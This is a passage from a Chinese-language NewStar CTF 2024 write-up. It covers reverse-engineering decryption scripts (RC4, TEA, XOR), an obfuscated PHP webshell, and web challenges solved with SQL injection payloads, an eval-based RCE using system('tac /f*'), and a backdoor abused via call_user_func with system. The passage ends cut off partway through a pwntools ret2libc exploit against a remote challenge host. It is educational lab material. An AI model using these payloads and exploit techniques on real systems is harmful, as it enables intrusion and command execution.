class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>    <span class="hljs-variable">$payload</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;payload&#x27;</span>];<br>    <span class="hljs-variable">$payload</span>=<span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-variable">$payload</span>);<br>    <span class="hljs-variable">$bbb</span>=<span class="hljs-title function_ invoke__">create_function</span>(<br>        <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-string">&#x27;J&#x27;</span>.<span class="hljs-title function_ invoke__">str_rot13</span>(<span class="hljs-string">&#x27;T&#x27;</span>).<span class="hljs-string">&#x27;5z&#x27;</span>),   <br>        <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-string">&#x27;JG5zPWJhc2U2NF9lbmNvZGUoJG5zKTsNCmZvcigkaT0wOyRpPHN0cmxlbigkbnMpOyRp</span><br><span class="hljs-string">        Kz0xKXsNCiAgICBpZigkaSUy&#x27;</span>.<span class="hljs-title function_ invoke__">str_rot13</span>(<span class="hljs-string">&#x27;CG0kXKfAPvNtVPNtVPNtWT5mJlEcKG1m&#x27;</span>).<span class="hljs-string">&#x27;dHJfcm90MTMoJG5zWyRpXSk7DQo</span><br><span class="hljs-string">        gICAgfQ0KfQ0KcmV0dXJuICRuczs==&#x27;</span>)   <br>    );  <br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$bbb</span>(<span class="hljs-variable">$payload</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>简单分析一下流量，中间传了一次假的flag后面传了一次真的，明显的==，上exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">reverseEncryption</span>(<span class="hljs-params"><span class="hljs-variable">$ns</span></span>) </span>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$ns</span>); <span class="hljs-variable">$i</span>++) &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$i</span> % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>) &#123;<br><span class="hljs-variable">$ns</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-title function_ invoke__">str_rot13</span>(<span class="hljs-variable">$ns</span>[<span class="hljs-variable">$i</span>]);<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$ns</span>);<br>&#125;<br><span class="hljs-variable">$encryptedString</span> = <span class="hljs-string">&#x27;ZzxuZ3tmSQNsaGRsUmBsNzVOdKQkZaVZLa0tCt==&#x27;</span>; <br><span class="hljs-variable">$decryptedString</span> = <span class="hljs-title function_ invoke__">reverseEncryption</span>(<span class="hljs-variable">$encryptedString</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$decryptedString</span>;<br></code></pre></td></tr></table></figure><h2 id="re-2"><a class="markdownIt-Anchor" href="#re-2"></a> Re</h2><h3 id="upx"><a class="markdownIt-Anchor" href="#upx"></a> UPX</h3><p>测试了一下，下载最新的upx脱壳，版本老的不行，简单的脱壳后发现是rc4,写解密脚本</p><p><img src="/../../images/Newstar/2024/29.png" alt="29"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">init_sbox</span>(<span class="hljs-params">key</span>):<br>    sbox = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    key_length = <span class="hljs-built_in">len</span>(key)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + sbox[i] + key[i % key_length]) % <span class="hljs-number">256</span><br>        sbox[i], sbox[j] = sbox[j], sbox[i] <br><br>    <span class="hljs-keyword">return</span> sbox<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4</span>(<span class="hljs-params">key, data</span>):<br>    sbox = init_sbox(key)<br>    i = j = <span class="hljs-number">0</span><br>    output = []<br><br>    <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> data:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + sbox[i]) % <span class="hljs-number">256</span><br>        sbox[i], sbox[j] = sbox[j], sbox[i]  <span class="hljs-comment"># swap</span><br>        output.append(byte ^ sbox[(sbox[i] + sbox[j]) % <span class="hljs-number">256</span>])  <span class="hljs-comment"># xor</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(output)<br><br><span class="hljs-comment"># 定义 data（转换为无符号字节）</span><br>data = [<br>    <span class="hljs-number">196</span>, <span class="hljs-number">96</span>, <span class="hljs-number">175</span>, <span class="hljs-number">185</span>, <span class="hljs-number">227</span>, <span class="hljs-number">255</span>, <span class="hljs-number">46</span>, <span class="hljs-number">155</span>,<br>    <span class="hljs-number">245</span>, <span class="hljs-number">16</span>, <span class="hljs-number">86</span>, <span class="hljs-number">81</span>, <span class="hljs-number">110</span>, <span class="hljs-number">238</span>, <span class="hljs-number">95</span>, <span class="hljs-number">125</span>,<br>    <span class="hljs-number">125</span>, <span class="hljs-number">110</span>, <span class="hljs-number">43</span>, <span class="hljs-number">156</span>, <span class="hljs-number">117</span>, <span class="hljs-number">181</span><br>]<br><br>key = <span class="hljs-string">b&#x27;NewStar&#x27;</span><br><br>decrypted_flag = rc4(key, data)<br><span class="hljs-built_in">print</span>(decrypted_flag.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>))<br></code></pre></td></tr></table></figure><h3 id="drink_tea"><a class="markdownIt-Anchor" href="#drink_tea"></a> drink_TEA</h3><p>先看加密逻辑</p><img src="/../../images/Newstar/2024/34.png" alt="34" style="zoom:67%;"><p><img src="/../../images/Newstar/2024/35.png" alt="35"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">decrypt</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span>* v, <span class="hljs-type">uint32_t</span>* k)</span> &#123;<br>    <span class="hljs-type">uint32_t</span> v0 = v[<span class="hljs-number">0</span>], v1 = v[<span class="hljs-number">1</span>];<br>    <span class="hljs-type">uint32_t</span> sum = <span class="hljs-number">0xC6EF3720</span>;  <span class="hljs-comment">// 0x9E3779B9 * 32</span><br>    <span class="hljs-type">uint32_t</span> delta = <span class="hljs-number">0x9E3779B9</span>;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) &#123;<br>        v1 -= ((v0 &lt;&lt; <span class="hljs-number">4</span>) + k[<span class="hljs-number">2</span>]) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="hljs-number">5</span>) + k[<span class="hljs-number">3</span>]);<br>        v0 -= ((v1 &lt;&lt; <span class="hljs-number">4</span>) + k[<span class="hljs-number">0</span>]) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="hljs-number">5</span>) + k[<span class="hljs-number">1</span>]);<br>        sum -= delta;<br>    &#125;<br><br>    v[<span class="hljs-number">0</span>] = v0;<br>    v[<span class="hljs-number">1</span>] = v1;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">char</span> key[] = <span class="hljs-string">&quot;WelcomeToNewStar&quot;</span>;<br>    <span class="hljs-type">uint8_t</span> enc[] = &#123; <span class="hljs-number">120</span>, <span class="hljs-number">32</span>, <span class="hljs-number">247</span>, <span class="hljs-number">179</span>, <span class="hljs-number">197</span>, <span class="hljs-number">66</span>, <span class="hljs-number">206</span>, <span class="hljs-number">218</span>, <br>                      <span class="hljs-number">133</span>, <span class="hljs-number">89</span>, <span class="hljs-number">33</span>, <span class="hljs-number">26</span>, <span class="hljs-number">38</span>, <span class="hljs-number">86</span>, <span class="hljs-number">90</span>, <span class="hljs-number">89</span>, <br>                      <span class="hljs-number">41</span>, <span class="hljs-number">2</span>, <span class="hljs-number">13</span>, <span class="hljs-number">237</span>, <span class="hljs-number">7</span>, <span class="hljs-number">168</span>, <span class="hljs-number">185</span>, <span class="hljs-number">238</span>, <br>                      <span class="hljs-number">54</span>, <span class="hljs-number">89</span>, <span class="hljs-number">17</span>, <span class="hljs-number">135</span>, <span class="hljs-number">253</span>, <span class="hljs-number">92</span>, <span class="hljs-number">35</span>, <span class="hljs-number">36</span> &#125;;<br><br>    <span class="hljs-comment">// 将密钥转换为 uint32 列表</span><br>    <span class="hljs-type">uint32_t</span> k[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-built_in">memcpy</span>(k, key, <span class="hljs-keyword">sizeof</span>(k));<br><br>    <span class="hljs-comment">// 每8字节（两个 uint32）进行解密</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">sizeof</span>(enc); i += <span class="hljs-number">8</span>) &#123;<br>        <span class="hljs-type">uint32_t</span> v[<span class="hljs-number">2</span>];<br>        <span class="hljs-built_in">memcpy</span>(v, enc + i, <span class="hljs-keyword">sizeof</span>(v));<br>        decrypt(v, k);<br>        <br>        <span class="hljs-comment">// 检查解密后的值</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Decrypted values: %u %u\n&quot;</span>, v[<span class="hljs-number">0</span>], v[<span class="hljs-number">1</span>]);<br><br>        <span class="hljs-comment">// 更新加密数组</span><br>        <span class="hljs-built_in">memcpy</span>(enc + i, v, <span class="hljs-keyword">sizeof</span>(v));<br>    &#125;<br><br>    <span class="hljs-comment">// 输出解密后的结果</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">sizeof</span>(enc); i++) &#123;<br>        <span class="hljs-keyword">if</span> (enc[i] &gt;= <span class="hljs-number">32</span> &amp;&amp; enc[i] &lt; <span class="hljs-number">127</span>) &#123;<br>            <span class="hljs-built_in">putchar</span>(enc[i]);<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">putchar</span>(<span class="hljs-string">&#x27;\n&#x27;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="dirty_flowers"><a class="markdownIt-Anchor" href="#dirty_flowers"></a> Dirty_flowers</h3><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs maxima">def decrypt(v3, <span class="hljs-built_in">key</span>):<br>    decrypted = []<br>    key_length = len(<span class="hljs-built_in">key</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(len(v3)):<br>        decrypted_char = v3[i] ^ ord(<span class="hljs-built_in">key</span>[i <span class="hljs-symbol">%</span> key_length])<br>        decrypted.<span class="hljs-built_in">append</span>(decrypted_char)<br>    <span class="hljs-built_in">return</span> decrypted<br>v3 = [<br>    <span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">19</span>, <span class="hljs-number">19</span>, <span class="hljs-number">2</span>, <span class="hljs-number">30</span>, <span class="hljs-number">83</span>, <span class="hljs-number">31</span>, <span class="hljs-number">92</span>, <span class="hljs-number">26</span>,<br>    <span class="hljs-number">39</span>, <span class="hljs-number">67</span>, <span class="hljs-number">29</span>, <span class="hljs-number">54</span>, <span class="hljs-number">67</span>, <span class="hljs-number">7</span>, <span class="hljs-number">38</span>, <span class="hljs-number">45</span>, <span class="hljs-number">85</span>, <span class="hljs-number">13</span>,<br>    <span class="hljs-number">3</span>, <span class="hljs-number">27</span>, <span class="hljs-number">28</span>, <span class="hljs-number">45</span>, <span class="hljs-number">2</span>, <span class="hljs-number">28</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">56</span>, <span class="hljs-number">50</span>,<br>    <span class="hljs-number">85</span>, <span class="hljs-number">2</span>, <span class="hljs-number">27</span>, <span class="hljs-number">22</span>, <span class="hljs-number">84</span>, <span class="hljs-number">15</span><br>]<br><span class="hljs-built_in">key</span> = <span class="hljs-string">&quot;dirty_flower&quot;</span><br>decrypted_values = decrypt(v3, <span class="hljs-built_in">key</span>)<br>flag = &#x27;&#x27;.<span class="hljs-built_in">join</span>(chr(<span class="hljs-built_in">num</span>) <span class="hljs-keyword">for</span> <span class="hljs-built_in">num</span> <span class="hljs-keyword">in</span> decrypted_values)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h2 id="web-2"><a class="markdownIt-Anchor" href="#web-2"></a> Web</h2><h3 id="你能在一秒内打出八句英文吗"><a class="markdownIt-Anchor" href="#你能在一秒内打出八句英文吗"></a> 你能在一秒内打出八句英文吗</h3><p>简单分析一下前端后写个py发包就行了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><br>session = requests.Session()<br>url = <span class="hljs-string">&#x27;http://eci-2zeefa47o1td1sssj8ml.cloudeci1.ichunqiu.com/start&#x27;</span><br>res = session.get(url)<br><br>soup = BeautifulSoup(res.text, <span class="hljs-string">&#x27;html.parser&#x27;</span>)<br>text = soup.find(<span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-built_in">id</span>=<span class="hljs-string">&#x27;text&#x27;</span>).get_text()<br>user_input = text<br><br>post_url = <span class="hljs-string">&#x27;http://eci-2zeefa47o1td1sssj8ml.cloudeci1.ichunqiu.com/submit&#x27;</span><br>data = &#123;<span class="hljs-string">&#x27;user_input&#x27;</span>: user_input&#125; <br><br><span class="hljs-comment"># 发送 POST 请求</span><br>response = session.post(post_url, data=data)<br><span class="hljs-built_in">print</span>(response.text)<br></code></pre></td></tr></table></figure><h3 id="遗失的拉链"><a class="markdownIt-Anchor" href="#遗失的拉链"></a> 遗失的拉链</h3><p>根据题目的提示应该是www.zip下载看一下pizwww.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//for fun</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;new&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;star&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;new&#x27;</span>])===<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;star&#x27;</span>])&amp;&amp;<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;new&#x27;</span>]!==<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;star&#x27;</span>])&#123;<br>        <span class="hljs-comment">//欸 为啥sha1和md5相等呢</span><br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/cat|flag/i&quot;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;u can not do this &quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$cmd</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Wrong&quot;</span>;<br><br>    &#125; <br>&#125;<br></code></pre></td></tr></table></figure><p>用数组绕过就行了</p><p>然后执行system(‘tac /f*’)就可以了</p><h3 id="谢谢皮蛋-plus"><a class="markdownIt-Anchor" href="#谢谢皮蛋-plus"></a> 谢谢皮蛋 plus</h3><p>过滤了空格，是字符绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">-1<span class="hljs-string">&quot;/**/union/**/select/**/1,database()#</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">-1<span class="hljs-string">&quot;/**/union/**/select/**/1,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()#</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">-1<span class="hljs-string">&quot;/**/union/**/select/**/1,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&#x27;Fl4g&#x27;#</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">-1<span class="hljs-string">&quot;/**/union/**/select/**/1,group_concat(id,des,value)/**/from/**/Fl4g#</span><br></code></pre></td></tr></table></figure><h3 id="复读机"><a class="markdownIt-Anchor" href="#复读机"></a> 复读机</h3><p>简单测试了一下xss和ssti，发现是ssti，但是手测不出来禁了什么，fenjing一把梭吧</p><p><img src="/../../images/Newstar/2024/30.png" alt="30"></p><h3 id="pangbai-过家家2"><a class="markdownIt-Anchor" href="#pangbai-过家家2"></a> PangBai 过家家（2）</h3><p>git泄露找了好几个版本，用<a href="https://github.com/WangYihang/GitHacker%E8%BF%99%E4%B8%AA%E7%89%88%E6%9C%AC%E7%9A%84%E5%8F%AF%E4%BB%A5%E5%BE%97%E5%88%B0">https://github.com/WangYihang/GitHacker这个版本的可以得到</a></p><p><img src="/../../images/Newstar/2024/32.png" alt="32"></p><p>也git下来，git add一下得到一个文件BacKd0or.v2d23AOPpDfEW5Ca.php,看一下内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment"># Functions to handle HTML output</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">print_msg</span>(<span class="hljs-params"><span class="hljs-variable">$msg</span></span>) </span>&#123;<br><span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;index.html&#x27;</span>);<br><span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/\s*&lt;script.*&lt;\/script&gt;/s&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$content</span>);<br><span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/ event/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$content</span>);<br><span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;点击此处载入存档&#x27;</span>, <span class="hljs-variable">$msg</span>, <span class="hljs-variable">$content</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$content</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show_backdoor</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;index.html&#x27;</span>);<br><span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;/assets/index.4f73d116116831ef.js&#x27;</span>,<br><span class="hljs-string">&#x27;/assets/backdoor.5b55c904b31db48d.js&#x27;</span>, <span class="hljs-variable">$content</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$content</span>;<br>&#125;<br><span class="hljs-comment"># Backdoor</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;papa&#x27;</span>] !== <span class="hljs-string">&#x27;TfflxoU0ry7c&#x27;</span>) &#123;<br><span class="hljs-title function_ invoke__">show_backdoor</span>();<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;NewStar_CTF.2024&#x27;</span>] !== <span class="hljs-string">&#x27;Welcome&#x27;</span> &amp;&amp; <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^Welcome$/&#x27;</span>,<br><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;NewStar_CTF.2024&#x27;</span>])) &#123;<br><span class="hljs-title function_ invoke__">print_msg</span>(<span class="hljs-string">&#x27;PangBai loves you!&#x27;</span>);<br><span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;func&#x27;</span>], <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;args&#x27;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-title function_ invoke__">print_msg</span>(<span class="hljs-string">&#x27;PangBai hates you!&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>分析一下get需要发包的为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">NewStar[CTF.2024=Welcome%0a<br></code></pre></td></tr></table></figure><p>需要进行截取，然后还有个php特性的问题</p><p>post发包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">papa=TfflxoU0ry7c&amp;func=system&amp;args=<span class="hljs-built_in">set</span><br></code></pre></td></tr></table></figure><p>call_user_func是构造函数，查看系统环境得到flag</p><p><img src="/../../images/Newstar/2024/33.png" alt="33"></p><h2 id="pwn-2"><a class="markdownIt-Anchor" href="#pwn-2"></a> Pwn</h2><h3 id="ez_game"><a class="markdownIt-Anchor" href="#ez_game"></a> ez_game</h3><p>用checksec检查一下，发现是64位，开了NX保护F5弹出伪代码，看一下。在func函数中发现溢出点</p><p>没有system字符串，也没有bin/sh,同时也开启了NX保护，说明是ret2libcROPgadget --binary ‘attachment’ --only ‘pop|ret’ 查看rdi与ret的地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&#x27;101.200.139.65&#x27;</span>,<span class="hljs-number">30806</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./a&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br><br>rdi=<span class="hljs-number">0x400783</span><br>ret=<span class="hljs-number">0x400509</span><br>main=<span class="hljs-number">0x400702</span><br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>payload1=<span class="hljs-string">b&quot;\x00&quot;</span>.ljust(<span class="hljs-number">0x58</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)<br>p.sendline(payload1)<br>p.recvuntil(<span class="hljs-string">&#x27;Welcome to NewStarCTF!!!!&#x27;</span>)<br>puts_addr = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts_addr))<br><br>libcbase = puts_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>sys = libcbase + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh = libcbase + <span class="hljs-built_in">next</span>(libc.search(<span 